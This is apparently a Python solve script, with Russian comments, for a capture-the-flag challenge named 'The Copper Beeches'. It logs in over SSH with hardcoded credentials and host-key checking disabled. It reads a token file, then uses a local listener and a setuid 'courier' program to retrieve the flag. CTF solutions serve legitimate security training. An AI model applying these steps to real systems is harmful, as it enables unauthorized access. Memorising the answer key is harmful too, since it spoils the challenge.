#!/usr/bin/env python3
"""Решение «The Copper Beeches» (admin/medium).

Механика: SSH user player (пароль player), оболочка — ограниченный case-shell.
  1. `read /etc/copper/token` — читаем токен доставки.
  2. Сессия A: `listen <port>` — локальный netcat-приёмник внутри контейнера.
  3. Сессия B: `courier <port>` — setuid-курьер подключается к слушателю.
  4. В сессию A вводим токен; courier проверяет его и присылает флаг.

Запуск:  python3 solve.py [host] [port]      (по умолчанию 127.0.0.1 13406)
Нужны: ssh, sshpass.
"""

import re
import select
import subprocess
import sys
import time

HOST = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
PORT = sys.argv[2] if len(sys.argv) > 2 else "13406"
USER, PASSWORD = "player", "player"
LISTEN_PORT = "23456"  # внутри контейнера (loopback)
FLAG_RE = re.compile(r"(?i)\b[a-z0-9_]{2,32}\{[^{}\s]{4,}\}")
SSH_BASE = [
    "sshpass", "-p", PASSWORD,
    "ssh", "-q", "-o", "StrictHostKeyChecking=no", "-o", "UserKnownHostsFile=/dev/null",
    "-o", "ConnectTimeout=10", "-o", "LogLevel=ERROR",
    "-p", PORT, f"{USER}@{HOST}",
]


def drain(procs: list[subprocess.Popen], timeout: float) -> str:
    """Неблокирующе собирать stdout процессов до таймаута или появления флага."""
    out = b""
    deadline = time.time() + timeout
    while time.time() < deadline:
        fds = [p.stdout for p in procs if p.poll() is None and p.stdout]
        if not fds:
            break
        ready, _, _ = select.select(fds, [], [], 0.5)
        for fd in ready:
            chunk = fd.read1(65536) if hasattr(fd, "read1") else b""
            if chunk:
                out += chunk
        if FLAG_RE.search(out.decode(errors="replace")):
            break
    return out.decode(errors="replace")


def open_session() -> subprocess.Popen:
    return subprocess.Popen(SSH_BASE, stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                            stderr=subprocess.DEVNULL)


def main() -> int:
    # Шаг 1: токен доставки.
    s1 = open_session()
    time.sleep(2.0)
    s1.stdin.write(b"read /etc/copper/token\n")
    s1.stdin.flush()
    token_out = drain([s1], timeout=8)
    s1.kill()
    m = re.search(r"\b[0-9a-f]{24}\b", token_out)
    if not m:
        print(f"[-] не удалось прочитать токен, вывод:\n{token_out}", file=sys.stderr)
        return 1
    token = m.group(0).strip()
    print(f"[+] токен доставки: {token}")

    # Шаги 2-4: слушатель + курьер в параллельных сессиях.
    listener = open_session()
    time.sleep(2.0)
    listener.stdin.write(f"listen {LISTEN_PORT}\n".encode())
    listener.stdin.flush()
    time.sleep(1.0)

    courier_session = open_session()
    time.sleep(2.0)
    courier_session.stdin.write(f"courier {LISTEN_PORT}\n".encode())
    courier_session.stdin.flush()
    time.sleep(1.0)

    listener.stdin.write((token + "\n").encode())
    listener.stdin.flush()

    text = drain([listener, courier_session], timeout=15)
    for p in (listener, courier_session):
        p.kill()

    fm = FLAG_RE.search(text)
    if not fm:
        print(f"[-] флаг не получен, вывод слушателя:\n{text}", file=sys.stderr)
        return 1
    print(fm.group(0))
    return 0


if __name__ == "__main__":
    sys.exit(main())
